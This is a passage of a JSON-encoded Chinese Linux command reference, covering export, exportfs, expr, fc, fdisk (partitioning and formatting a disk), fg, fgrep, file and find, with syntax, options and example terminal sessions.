行时，它不会自动得到原为脚本（调用者）里定义的变量的访问权，除非这些变量已经被显式地设置为可用。export命令可以用于传递一个或多个变量的值到任何后继脚本。\n\n### 语法  \n\n```\nexport(选项)(参数)\n```\n\n### 选项  \n\n```\n-f：代表[变量名称]中为函数名称；\n-n：删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中；\n-p：列出所有的shell赋予程序的环境变量。\n```\n\n### 参数  \n\n变量：指定要输出或者删除的环境变量。\n\n### 实例  \n\n一般来说，配置交叉编译工具链的时候需要指定编译工具的路径，此时就需要设置环境变量。查看已经存在的环境变量：\n\n```\n[root@localhost ~]# export\ndeclare -x G_BROKEN_FILENAMES\u003d\"1\"\ndeclare -x HISTSIZE\u003d\"1000\"\ndeclare -x HOME\u003d\"/root\"\ndeclare -x hostname\u003d\"localhost\"\ndeclare -x INPUTRC\u003d\"/etc/inputrc\"\ndeclare -x LANG\u003d\"zh_CN.UTF-8\"\ndeclare -x LESSOPEN\u003d\"|/usr/bin/lesspipe.sh %s\"\ndeclare -x logname\u003d\"root\"\ndeclare -x LS_COLORS\u003d\"no\u003d00:fi\u003d00:di\u003d01;34:ln\u003d01;36:pi\u003d40;33:so\u003d01;35:bd\u003d40;33;01:cd\u003d40;33;01:or\u003d01;05;37;41:mi\u003d01;05;37;41:ex\u003d01;32:*.cmd\u003d01;32:*.exe\u003d01;32:*.com\u003d01;32:*.btm\u003d01;32:*.bat\u003d01;32:*.sh\u003d01;32:*.csh\u003d01;32:*.tar\u003d01;31:*.tgz\u003d01;31:*.arj\u003d01;31:*.taz\u003d01;31:*.lzh\u003d01;31:*.zip\u003d01;31:*.z\u003d01;31:*.Z\u003d01;31:*.gz\u003d01;31:*.bz2\u003d01;31:*.bz\u003d01;31:*.tz\u003d01;31:*.rpm\u003d01;31:*.cpio\u003d01;31:*.jpg\u003d01;35:*.gif\u003d01;35:*.bmp\u003d01;35:*.xbm\u003d01;35:*.xpm\u003d01;35:*.png\u003d01;35:*.tif\u003d01;35:\"\ndeclare -x mail\u003d\"/var/spool/mail/root\"\ndeclare -x OLDPWD\ndeclare -x PATH\u003d\"/usr/kerberos/sbin:/usr/kerberos/bin:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin:/root/bin\"\ndeclare -x pwd\u003d\"/root\"\ndeclare -x SHELL\u003d\"/bin/bash\"\ndeclare -x SHLVL\u003d\"1\"\ndeclare -x SSH_CLIENT\u003d\"192.168.2.111 2705 22\"\ndeclare -x SSH_CONNECTION\u003d\"192.168.2.111 2705 192.168.2.2 22\"\ndeclare -x SSH_TTY\u003d\"/dev/pts/0\"\ndeclare -x TERM\u003d\"linux\"\ndeclare -x USER\u003d\"root\"\n```\n\n\n"},{"name":"exportfs","categoryId":0,"data":"exportfs\n\u003d\u003d\u003d\n\n管理NFS共享文件系统列表\n\n## 补充说明\n\nexportfs 命令用来管理当前NFS共享的文件系统列表。\n\n参数：\n\n```\n-a 打开或取消所有目录共享。\n-o options,...指定一列共享选项，与 exports(5) 中讲到的类似。\n-i 忽略 /etc/exports 文件，从而只使用默认的和命令行指定的选项。\n-r 重新共享所有目录。它使 /var/lib/nfs/xtab 和 /etc/exports 同步。 它将 /etc/exports 中已删除的条目从 /var/lib/nfs/xtab 中删除，将内核共享表中任何不再有效的条目移除。\n-u 取消一个或多个目录的共享。\n-f 在“新”模式下，刷新内核共享表之外的任何东西。 任何活动的客户程序将在它们的下次请求中得到 mountd添加的新的共享条目。\n-v 输出详细信息。当共享或者取消共享时，显示在做什么。 显示当前共享列表的时候，同时显示共享的选项。\n```\n\n\n"},{"name":"expr","categoryId":0,"data":"expr\n\u003d\u003d\u003d\n\n一款表达式计算工具\n\n## 补充说明\n\n**expr命令** 是一款表达式计算工具，使用它完成表达式的求值操作。\n\nexpr的常用运算符：\n\n*   加法运算：+\n*   减法运算：-\n*   乘法运算：\\*\n*   除法运算：/\n*   求摸（取余）运算：%\n\n### 语法  \n\n```\nexpr(选项)(参数)\n```\n\n### 选项  \n\n```\n--help：显示指令的帮助信息；\n--version：显示指令版本信息。\n```\n\n### 参数  \n\n表达式：要求值的表达式。\n\n### 实例  \n\n```\nresult\u003d`expr 2 + 3`\nresult\u003d$(expr $no1 + 5)\n```\n\n\n"},{"name":"fc","categoryId":0,"data":"fc\n\u003d\u003d\u003d\n\n修改历史命令并执行\n\n## 补充说明\n\n**fc命令** 自动掉用vi编辑器修改已有历史命令，当保存时立即执行修改后的命令，也可以用来显示历史命令。fc命令编辑历史命令时，会自动调用vi编辑器。fc保存文件后，会自动执行所编辑过的命令。\n\n### 语法  \n\n```\nfc(选项)(参数)\n```\n\n### 选项  \n\n```\n-l：显示历史命令；\n-n：显示历史命令时，不显示编号；\n-r：反序显示历史命令。\n```\n\n### 参数  \n\n*   起始指令编号：指定要编辑的起始指令编号；\n*   结尾指令编号：指定要编辑的结尾指令编号。\n\n### 实例  \n\n使用该指令显示最近使用的10条历史命令，输入如下命令：\n\n```\n[root@localhost ~]# fc -l -10     #显示10条历史命令\n1039     type -a grep\n1040     export\n1041     history 10\n1042     ulimit -a\n1043     shopt\n1044     help ls\n1045     help env\n1046     help short\n1047     help shopt\n1048     showkey -a\n```\n\n第一列信息是历史命令的编号，第二列信息是历史命令的具体格式。若用户需要编辑第1040条历史命令时，则输入如下命令：\n\n```\nfc 1040                    #编辑第1040条历史命令\n```\n\n命令执行成功后，将自动调用vi编辑器编辑指定的命令，编辑完成后保存，会自动执行修改后的命令。当用户在vi编辑器中修改指令并保存后，被修改的命令会被自动调用并执行。\n\n\n"},{"name":"fdisk","categoryId":3,"data":"fdisk\n\u003d\u003d\u003d\n\n查看磁盘使用情况和磁盘分区\n\n## 补充说明\n\n**fdisk命令** 用于观察硬盘实体使用情况，也可对硬盘分区。它采用传统的问答式界面，而非类似DOS fdisk的cfdisk互动式操作界面，因此在使用上较为不便，但功能却丝毫不打折扣。\n\n### 语法  \n\n```\nfdisk(选项)(参数)\n```\n\n### 选项  \n\n```\n-b\u003c分区大小\u003e：指定每个分区的大小；\n-l：列出指定的外围设备的分区表状况；\n-s\u003c分区编号\u003e：将指定的分区大小输出到标准输出上，单位为区块；\n-u：搭配\"-l\"参数列表，会用分区数目取代柱面数目，来表示每个分区的起始地址；\n-v：显示版本信息。\n```\n\n### 参数  \n\n设备文件：指定要进行分区或者显示分区的硬盘设备文件。\n\n### 实例  \n\n首先选择要进行操作的磁盘：\n\n```\n[root@localhost ~]# fdisk /dev/sdb\n```\n\n输入`m`列出可以执行的命令：\n\n```\ncommand (m for help): m\nCommand action\n   a   toggle a bootable flag\n   b   edit bsd disklabel\n   c   toggle the dos compatibility flag\n   d   delete a partition\n   l   list known partition types\n   m   print this menu\n   n   add a new partition\n   o   create a new empty DOS partition table\n   p   print the partition table\n   q   quit without saving changes\n   s   create a new empty Sun disklabel\n   t   change a partition\u0027s system id\n   u   change display/entry units\n   v   verify the partition table\n   w   write table to disk and exit\n   x   extra functionality (experts only)\n```\n\n输入`p`列出磁盘目前的分区情况：\n\n```\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1           1        8001   8e  Linux LVM\n/dev/sdb2               2          26      200812+  83  Linux\n```\n\n输入`d`然后选择分区，删除现有分区：\n\n```\nCommand (m for help): d\nPartition number (1-4): 1\n\nCommand (m for help): d\nSelected partition 2\n```\n\n查看分区情况，确认分区已经删除：\n\n```\nCommand (m for help): print\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n\nCommand (m for help):\n```\n\n输入`n`建立新的磁盘分区，首先建立两个主磁盘分区：\n\n```\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\np    //建立主分区\nPartition number (1-4): 1  //分区号\nFirst cylinder (1-391, default 1):  //分区起始位置\nUsing default value 1\nlast cylinder or +size or +sizeM or +sizeK (1-391, default 391): 100  //分区结束位置，单位为扇区\n\nCommand (m for help): n  //再建立一个分区\nCommand action\n   e   extended\n   p   primary partition (1-4)\np \nPartition number (1-4): 2  //分区号为2\nFirst cylinder (101-391, default 101):\nUsing default value 101\nLast cylinder or +size or +sizeM or +sizeK (101-391, default 391): +200M  //分区结束位置，单位为M\n```\n\n确认分区建立成功：\n\n```\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n```\n\n再建立一个逻辑分区：\n\n```\nCommand (m for help): n\nCommand action\n   e   extended\n   p   primary partition (1-4)\ne  //选择扩展分区\nPartition number (1-4): 3\nFirst cylinder (126-391, default 126):\nUsing default value 126\nLast cylinder or +size or +sizeM or +sizeK (126-391, default 391):\nUsing default value 391\n```\n\n确认扩展分区建立成功：\n\n```\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n/dev/sdb3             126         391     2136645    5  Extended\n```\n\n在扩展分区上建立两个逻辑分区：\n\n```\nCommand (m for help): n\nCommand action\n   l   logical (5 or over)\n   p   primary partition (1-4)\nl //选择逻辑分区\nFirst cylinder (126-391, default 126):\nUsing default value 126\nLast cylinder or +size or +sizeM or +sizeK (126-391, default 391): +400M    \n\nCommand (m for help): n\nCommand action\n   l   logical (5 or over)\n   p   primary partition (1-4)\nl\nFirst cylinder (176-391, default 176):\nUsing default value 176\nLast cylinder or +size or +sizeM or +sizeK (176-391, default 391):\nUsing default value 391\n```\n\n确认逻辑分区建立成功：\n\n```\nCommand (m for help): p\n\nDisk /dev/sdb: 3221 MB, 3221225472 bytes\n255 heads, 63 sectors/track, 391 cylinders\nUnits \u003d cylinders of 16065 * 512 \u003d 8225280 bytes\n\n   Device Boot      Start         End      Blocks   Id  System\n/dev/sdb1               1         100      803218+  83  Linux\n/dev/sdb2             101         125      200812+  83  Linux\n/dev/sdb3             126         391     2136645    5  Extended\n/dev/sdb5             126         175      401593+  83  Linux\n/dev/sdb6             176         391     1734988+  83  Linux\n\nCommand (m for help):\n```\n\n从上面的结果我们可以看到，在硬盘sdb我们建立了2个主分区（sdb1，sdb2），1个扩展分区（sdb3），2个逻辑分区（sdb5，sdb6）\n\n注意：主分区和扩展分区的磁盘号位1-4，也就是说最多有4个主分区或者扩展分区，逻辑分区开始的磁盘号为5，因此在这个实验中试没有sdb4的。\n\n最后对分区操作进行保存：\n\n```\nCommand (m for help): w\nThe partition table has been altered!\n\nCalling ioctl() to re-read partition table.\nSyncing disks.\n```\n\n建立好分区之后我们还需要对分区进行格式化才能在系统中使用磁盘。\n\n在sdb1上建立ext2分区：\n\n```\n[root@localhost ~]# mkfs.ext2 /dev/sdb1\nmke2fs 1.39 (29-May-2006)\nFilesystem label\u003d\nOS type: Linux\nBlock size\u003d4096 (log\u003d2)\nFragment size\u003d4096 (log\u003d2)\n100576 inodes, 200804 blocks\n10040 blocks (5.00%) reserved for the super user\nFirst data block\u003d0\nMaximum filesystem blocks\u003d209715200\n7 block groups\n32768 blocks per group, 32768 fragments per group\n14368 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840\n\nWriting inode tables: done                           \nWriting superblocks and filesystem accounting information: done\n\nThis filesystem will be automatically checked every 32 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n```\n\n在sdb6上建立ext3分区：\n\n```\n[root@localhost ~]# mkfs.ext3 /dev/sdb6\nmke2fs 1.39 (29-May-2006)\nFilesystem label\u003d\nOS type: Linux\nBlock size\u003d4096 (log\u003d2)\nFragment size\u003d4096 (log\u003d2)\n217280 inodes, 433747 blocks\n21687 blocks (5.00%) reserved for the super user\nFirst data block\u003d0\nMaximum filesystem blocks\u003d444596224\n14 block groups\n32768 blocks per group, 32768 fragments per group\n15520 inodes per group\nSuperblock backups stored on blocks:\n        32768, 98304, 163840, 229376, 294912\n\nWriting inode tables: done                           \nCreating journal (8192 blocks): done\nWriting superblocks and filesystem accounting information: done\n\nThis filesystem will be automatically checked every 32 mounts or\n180 days, whichever comes first.  Use tune2fs -c or -i to override.\n[root@localhost ~]#\n```\n\n建立两个目录`/oracle`和`/web`，将新建好的两个分区挂载到系统：\n\n```\n[root@localhost ~]# mkdir /oracle\n[root@localhost ~]# mkdir /web\n[root@localhost ~]# mount /dev/sdb1 /oracle\n[root@localhost ~]# mount /dev/sdb6 /web\n```\n\n查看分区挂载情况：\n\n```\n[root@localhost ~]# df -h\n文件系统              容量  已用 可用 已用% 挂载点\n/dev/mapper/VolGroup00-LogVol00\n                      6.7G  2.8G  3.6G  44% /\n/dev/sda1              99M   12M   82M  13% /boot\ntmpfs                 125M     0  125M   0% /dev/shm\n/dev/sdb1             773M  808K  733M   1% /oracle\n/dev/sdb6             1.7G   35M  1.6G   3% /web\n```\n\n如果需要每次开机自动挂载则需要修改`/etc/fstab`文件，加入两行配置：\n\n```\n[root@localhost ~]# vim /etc/fstab\n\n/dev/VolGroup00/LogVol00 /                       ext3    defaults        1 1\nLABEL\u003d/boot             /boot                   ext3    defaults        1 2\ntmpfs                   /dev/shm                tmpfs   defaults        0 0\ndevpts                  /dev/pts                devpts  gid\u003d5,mode\u003d620  0 0\nsysfs                   /sys                    sysfs   defaults        0 0\nproc                    /proc                   proc    defaults        0 0\n/dev/VolGroup00/LogVol01 swap                    swap    defaults        0 0\n/dev/sdb1               /oracle                 ext2    defaults        0 0\n/dev/sdb6               /web                    ext3    defaults        0 0\n```\n\n\n"},{"name":"fg","categoryId":0,"data":"fg\n\u003d\u003d\u003d\n\n将后台作业放到前台终端运行\n\n## 补充说明\n\n**fg命令** 用于将后台作业（在后台运行的或者在后台挂起的作业）放到前台终端运行。与bg命令一样，若后台任务中只有一个，则使用该命令时，可以省略任务号。\n\n在Linux系统中执行某些操作时候，有时需要将当前任务暂停调至后台，或有时须将后台暂停的任务重启开启并调至前台，这一序列的操作将会使用到 jobs、bg、和 fg 三个命令以及两个快捷键来完成。\n\n### 语法  \n\n```\nfg(参数)\n```\n\n### 参数  \n\n作业标识：指定要放到前台的作业标识号。\n\n### 实例  \n\n使用fg命令将任务号为1的任务从后台执行转换到前台执行，输入如下命令：\n\n```\nfg 1          #将任务转换到前台执行\n```\n\n执行上面的命令后，命令行窗口将显示如下信息：\n\n```\nfind / -name password       #前台执行命令\n```\n\n\n"},{"name":"fgrep","categoryId":1,"data":"fgrep\n\u003d\u003d\u003d\n\n为文件搜索文字字符串\n\n## 补充说明\n\n**fgrep命令** 是用来搜索 file 参数指定的输入文件（缺省为标准输入）中的匹配模式的行。fgrep 命令特别搜索 Pattern 参数，它们是固定的字符串。如果在 File 参数中指定一个以上的文件 fgrep 命令将显示包含匹配行的文件。\n\nfgrep 命令于 grep 和 egrep 命令不同，因为它搜索字符串而不是搜索匹配表达式的模式。fgrep 命令使用快速的压缩算法。`$, *, \u0026#91;, |, (, )`和`\\`等字符串被 fgrep 命令按字面意思解释。这些字符并不解释为正则表达式，但它们在 grep 和 egrep 命令中解释为正则表达式。因为这些字符对于 shell 有特定的含义，完整的字符串应该加上单引号`‘ ... ’`。. 如果没有指定文件， fgrep 命令假定标准输入。一般，找到的每行都复制到标准输出中去。如果不止一个输入文件，则在找到的每行前打印文件名。\n\n1.  fgrep 命令和带 -F 标志的 grep命令是一样的但出错和用法消息不同-s 标志功能也不同。\n2.  每行限制在 2048 个字节。\n3.  段落（-p 标志下）目前限制在5000个字符的长度。\n4.  不要在特定的文件中运行 grep 命令，因为会产生不可预料的结果。\n5.  输入行不能包含空字符。\n6.  输入文件应该以换行字符结尾。\n7.  虽然可以同时指定很多标志，但某些标志会覆盖其余的标志。例如，如果同时指定 -l 和 -n ，只有文件名写入到标准输出中去。\n\n### 语法  \n\n```\nfgrep(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：在找到的每行之前添加行所在的块编号。使用此标志有助于按照上下文查找磁盘块号码。-b 标志不能用于标准输入或者管道输入。\n-c：仅显示匹配行的计数。\n-e 模式：指定模式。这个工作模式很简单，但当此模式以 a-(减号) 开头时却是很有用的。\n-f StringFile：指定包含字符串的文件。\n-h：当多个文件被处理时隐藏文件名。\n-i：当进行比较时忽略字母的大小写。\n-l：只列出包含匹配行的文件名（一次）。文件名之间用换行符分隔。\nn：将文件中每行的相对行号置于行前。\n-pSeparator：显示包含匹配行的整个段落。段落之间将按照Separator参数指定的段落分隔符加以分隔，这些分隔符是与搜索模式有着相同格式的模式。包含段落分隔符的行将仅用作分隔符；它们不会被包含在输出中。缺省的段落分隔符是空白行。\n-q：禁止所有写入到标准输出的操作，不管是否为匹配行。如果选中输入行，以 0 状态退出。\n-s：仅显示出错消息。这在检查状态时很有用。\n-v：显示除了匹配特定模式的行以外的所有行。\n-w：执行单词搜索。\n-x：显示匹配模式的行，要求无额外的字符。\n-y：当进行比较时忽略字符的大小写。\n```\n\n此命令返回以下出口值：\n\n```\n0    找到匹配项。\n1    未找到匹配项。\n\u003e1   发现语法错误，或者文件不可访问（即使找到了匹配项）。\n```\n\n### 实例  \n\n **搜索几个文件中的一个简单字符串：** \n\n```\nfgrep strcpy *.c\n```\n\n在当前目录下所有以 .c 字符串结尾的文件中搜索字符串 strcpy。\n\n **计数匹配某模式的行数：** \n\n```\nfgrep -c 『{』pgm.cfgrep -c 『}』pgm.c\n```\n\n显示在 pgm.c 中包含左括号和右括号的行的数目。\n\n如果在您的 C 程序中一行中没有包含多于一个 { (左括号) 或者 } (右括号)，并且括号正确匹配，那么这两个数字将是一样的。如果这两个数字不一样，您可以将包含括号的行按照他们在文件中的位置顺序显示出来，使用以下命令：\n\n```\negrep {\\|} pgm.c\n```\n\n **显示包含某模式的文件名：** \n\n```\nfgrep -l strcpy *.c\n```\n\n搜索当前目录下以 .c 结尾的文件，然后显示包含 strcpy 字符串的文件名。\n\n\n"},{"name":"file","categoryId":6,"data":"file\n\u003d\u003d\u003d\n\n用来探测给定文件的类型。\n\n## 补充说明\n\n**file命令** 用来探测给定文件的类型。file命令对文件的检查分为文件系统、魔法幻数检查和语言检查3个过程。\n\n### 语法  \n\n```\nfile(选项)(参数)\n```\n\n### 选项  \n\n```\n-b：列出辨识结果时，不显示文件名称；\n-c：详细显示指令执行过程，便于排错或分析程序执行的情形；\n-f\u003c名称文件\u003e：指定名称文件，其内容有一个或多个文件名称时，让file依序辨识这些文件，格式为每列一个文件名称；\n-L：直接显示符号连接所指向的文件类别；\n-m\u003c魔法数字文件\u003e：指定魔法数字文件；\n-v：显示版本信息；\n-z：尝试去解读压缩文件的内容。\n```\n\n### 参数  \n\n文件：要确定类型的文件列表，多个文件之间使用空格分开，可以使用shell通配符匹配多个文件。\n\n### 实例  \n\n显示文件类型\n\n```\n[root@localhost ~]# file install.log\ninstall.log: UTF-8 Unicode text\n\n[root@localhost ~]# file -b install.log      \u003c\u003d\u003d 不显示文件名称\nUTF-8 Unicode text\n\n[root@localhost ~]# file -i install.log      \u003c\u003d\u003d 显示MIME类别。\ninstall.log: text/plain; charset\u003dutf-8\n\n[root@localhost ~]# file -b -i install.log\ntext/plain; charset\u003dutf-8\n\n```\n\n显示符号链接的文件类型\n\n```\n[root@localhost ~]# ls -l /var/mail\nlrwxrwxrwx 1 root root 10 08-13 00:11 /var/mail -\u003e spool/mail\n\n[root@localhost ~]# file /var/mail\n/var/mail: symbolic link to `spool/mail\u0027\n\n[root@localhost ~]# file -L /var/mail\n/var/mail: directory\n\n[root@localhost ~]# file /var/spool/mail\n/var/spool/mail: directory\n\n[root@localhost ~]# file -L /var/spool/mail\n/var/spool/mail: directory\n\n```\n\n\n"},{"name":"find","categoryId":6,"data":"find\n\u003d\u003d\u003d\n\n在指定目录下查找文件\n\n## 补充说明\n\n**find命令** 用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则find命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。\n\n### 语法  \n\n```\nfind(选项)(参数)\n```\n\n### 选项  \n\n```\n-amin\u003c分钟\u003e：查找在指定时间曾被存取过的文件或目录，单位以分钟计算；\n-anewer\u003c参考文件或目录\u003e：查找其存取时间较指定文件或目录的存取时间更接近现在的文件或目录；\n-atime\u003c24小时数\u003e：查找在指定时间曾被存取过的文件或目录，单位以24小时计算；\n-cmin\u003c分钟\u003e：查找在指定时间之时被更改过的文件或目录；\n-cnewer\u003c参考文件或目录\u003e查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；\n-ctime\u003c24小时数\u003e：查找在指定时间之时被更改的文件或目录，单位以24小时计算；\n-daystart：从本日开始计算时间；\n-depth：从指定目录下最深层的子目录开始查找；\n-expty：寻找文件大小为0 Byte的文件，或目录下没有任何子目录或文件的空目录；\n-exec\u003c执行指令\u003e：假设find指令的回传值为True，就执行该指令；\n-false：将find指令的回传值皆设为False；\n-fls\u003c列表文件\u003e：此参数的效果和指定“-ls”参数类似，但会把结果保存为指定的列表文件；\n-follow：排除符号连接；\n-fprint\u003c列表文件\u003e：此参数的效果和指定“-print”参数类似，但会把结果保存成指定的列表文件；\n-fprint0\u003c列表文件\u003e：此参数的效果和指定“-print0”参数类似，但会把结果保存成指定的列表文件；\n-fprintf\u003c列表文件\u003e\u003c输出格式\u003e：此参数的效果和指定“-printf”参数类似，但会把结果保存成指定的列表文件；\n-fstype\u003c文件系统类型\u003e：只寻找该文件系统类型下的文件或目录；\n-gid\u003c群组识别码\u003e：查找符合指定之群组识别码的文件或目录；\n-group\u003c群组名称\u003e：查找符合指定之群组名称的文件或目录；\n-help或——help：在线帮助；\n-ilname\u003c范本样式\u003e：此参数的效果和指定“-lname”参数类似，但忽略字符大小写的差别；\n-iname\u003c范本样式\u003e：此参数的效果和指定“-name”参数类似，但忽略字符大小写的差别；\n-inum\u003cinode编号\u003e：查找符合指定的inode编号的文件或目录；\n-ipath\u003c范本样式\u003e：此参数的效果和指定“-path”参数类似，但忽略字符大小写的差别；\n-iregex\u003c范本样式\u003e：此参数的效果和指定“-regexe”参数类似，但忽略字符大小写的差别；\n-links\u003c连接数目\u003e：查找符合指定的硬连接数目的文件或目录；\n-iname\u003c范本样式\u003e：指定字符串作为寻找符号连接的范本样式；\n-ls：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出；\n-maxdepth\u003c目录层级\u003e：设置最大目录层级；\n-mindepth\u003c目录层级\u003e：设置最小目录层级；\n-mmin\u003c分钟\u003e：查找在指定时间曾被更改过的文件或目录，单位以分钟计算；\n-mount：此参数的效果和指定“-xdev”相同；\n-mtime\u003c24小时数\u003e：查找在指定时间曾被更改过的文件或目录，单位以24小时计算；\n-name\u003c范本样式\u003e：指定字符串作为寻找文件或目录的范本样式；\n-newer\u003c参考文件或目录\u003e：查找其更改时间较指定文件或目录的更改时间更接近现在的文件或目录；\n-nogroup：找出不属于本地主机群组识别码的文件或目录；\n-noleaf：不去考虑目录至少需拥有两个硬连接存在；\n-nouser：找出不属于本地主机用户识别码的文件或目录；\n-ok\u003c执行指令\u003e：此参数的效果和指定“-exec”类似，但在执行指令之前会先询问用户，若回答“y”或“Y”，则放弃执行命令；\n-path\u003c范本样式\u003e：指定字符串作为寻找目录的范本样式；\n-perm\u003c权限数值\u003e：查找符合指定的权限数值的文件或目录；\n-print：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；\n-print0：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为全部的名称皆在同一行；\n-printf\u003c输出格式\u003e：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式可以自行指定；\n-prune：不寻找字符串作为寻找文件或目录的范本样式;\n-regex\u003c范本样式\u003e：指定字符串作为寻找文件或目录的范本样式；\n-size\u003c文件大小\u003e：查找符合指定的文件大小的文件；\n-true：将find指令的回传值皆设为True；\n-typ\u003c文件类型\u003e：只寻找符合指定的文件类型的文件；\n-uid\u003c用户识别码\u003e：查找符合指定的用户识别码的文件或目录；\n-used\u003c日数\u003e：查找文件或目录被更改之后在指定时间曾被存取过的文件或目录，单位以日计算；\n-user\u003c拥有者名称\u003e：查找符和指定的拥有者名称的文件或目录；\n-version或——version：显示版本信息；\n-xdev：将范围局限在先行的文件系统中；\n-xtype\u003c文件类型\u003e：此参数的效果和指定“-type”参数类似，差别在于它针对符号连接检查。\n```\n\n### 参数  \n\n起始目录：查找文件的起始目录。\n\n### 实例\n\n```bash\n# 当前目录搜索所有文件，文件内容 包含 “140.206.111.111” 的内容\nfind . -type f -name \"*\" | xargs grep \"140.206.111.111\"\n```\n\n#### 根据文件或者正则表达式进行匹配  \n\n列出当前目录及子目录下所有文件和文件夹\n\n```\nfind .\n```\n\n在`/home`目录下查找以.txt结尾的文件名\n\n```\nfind /home -name \"*.txt\"\n```\n\n同上，但忽略大小写\n\n```\nfind /home -iname \"*.txt\"\n```\n\n当前目录及子目录下查找所有以.txt和.pdf结尾的文件\n\n```\nfind . \\( -name \"*.txt\" -o -name \"*.pdf\" \\)\n\n或\n\nfind . -name \"*.txt\" -o -name \"*.pdf\" \n```\n\n匹配文件路径或者文件\n\n```\nfind /usr/ -path \"*local*\"\n```\n\n基于正则表达式匹配文件路径\n\n```\nfind . -regex \".*\\(\\.txt\\|\\.pdf\\)$\"\n```\n\n同上，但忽略大小写\n\n```\nfind . -iregex \".*\\(\\.txt\\|\\.pdf\\)$\"\n```\n\n#### 否定参数  \n\n找出/home下不是以.txt结尾的文件\n\n```\nfind /home ! -name \"*.txt\"\n```\n\n#### 根据文件类型进行搜索  \n\n```\nfind . -type 类型参数\n```\n\n类型参数列表：\n\n*    **f**  普通文件\n*    **l**  符号连接\n*    **d**  目录\n*    **c**  字符设备\n*    **b**  块设备\n*    **s**  套接字\n*    **p**  Fifo\n\n#### 基于目录深度搜索  \n\n向下最大深度限制为3\n\n```\nfind . -maxdepth 3 -type f\n```\n\n搜索出深度距离当前目录至少2个子目录的所有文件\n\n```\nfind . -mindepth 2 -type f\n```\n\n#### 根据文件时间戳进行搜索  \n\n```\nfind . -type f 时间戳\n```\n\nUNIX/Linux文件系统每个文件都有三种时间戳：\n\n*    **访问时间** （-atime/天，-amin/分钟）：用户最近一次访问时间。\n*    **修改时间** （-mtime/天，-mmin/分钟）：文件最后一次修改时间。\n*    **变化时间** （-ctime/天，-cmin/分钟）：文件数据元（例如权限等）最后一次修改时间。\n\n搜索最近七天内被访问过的所有文件\n\n```\nfind . -type f -atime -7\n```\n\n搜索恰好在七天前被访问过的所有文件\n\n```\nfind . -type f -atime 7\n```\n\n搜索超过七天内被访问过的所有文件\n\n```\nfind . -type f -atime +7\n```\n\n搜索访问时间超过10分钟的所有文件\n\n```\nfind . -type f -amin +10\n```\n\n找出比file.log修改时间更长的所有文件\n\n```\nfind . -type f -newer file.log\n```\n\n#### 根据文件大小进行匹配  \n\n```\nfind . -type f -size 文件大小单元\n```\n\n文件大小单元：\n\n*    **b**  —— 块（512字节）\n*    **c**  —— 字节\n*    **w**  —— 字（2字节）\n*    **k**  —— 千字节\n*    **M**  —— 兆字节\n*    **G**  —— 吉字节\n\n搜索大于10KB的文件\n\n```\nfind . -type f -size +10k\n```\n\n搜索小于10KB的文件\n\n```\nfind . -type f -size -10k\n```\n\n搜索等于10KB的文件\n\n```\nfind . -type f -size 10k\n```\n\n#### 删除匹配文件  \n\n删除当前目录下所有.txt文件\n\n```\nfind . -type f -name \"*.txt\" -delete\n```\n\n#### 根据文件权限/所有权进行匹配  \n\n当前目录下搜索出权限为777的文件\n\n```\nfind . -type f -perm 777\n```\n\n找出当前目录下权限不是644的php文件\n\n```\nfind . -type f -name \"*.php\" ! -perm 644\n```\n\n找出当前目录用户tom拥有的所有文件\n\n```\nfind . -type f -user tom\n```\n\n找出当前目录用户组sunk拥有的所有文件\n\n```\nfind . -type f -group sunk\n```\n\n#### 借助`-exec`选项与其他命令结合使用  \n\n找出当前目录下所有root的文件，并把所有权更改为用户tom\n\n```\nfind .-type f -user root -exec chown tom {} \\;\n```\n\n上例中， **{}**  用于与 **-exec** 选项结合使用来匹配所有文件，然后会被替换为相应的文件名。\n\n找出自己家目录下所有的.txt文件并删除\n\n```\nfind $HOME/. -name \"*.txt\" -ok rm {} \\;\n```\n\n上例中， **-ok** 和 **-exec** 行为一样，不过它会给出提示，是否执行相应的操作。\n\n查找当前目录下所有.txt文件并把他们拼接起来写入到all.txt文件中\n\n```\nfind . -type f -name \"*.txt\" -exec cat {} \\;\u003e all.txt\n```\n\n将30天前的.log文件移动到old目录中\n\n```\nfind . -type f -mtime +30 -name \"*.log\" -exec cp {} old \\;\n```\n\n找出当前目录下所有.txt文件并以“File:文件名”的形式打印出来\n\n```\nfind . -type f -name \"*.txt\" -exec printf \"File: %s\\n\" {} \\;\n```\n\n因为单行命令中-exec参数中无法使用多个命令，以下方法可以实现在-exec之后接受多条命令\n\n```\n-exec ./text.sh {} \\;\n```\n\n#### 搜索但跳出指定的目录  \n\n查找当前目录或者子目录下所有.txt文件，但是跳过子目录sk\n\n```\nfind . -path 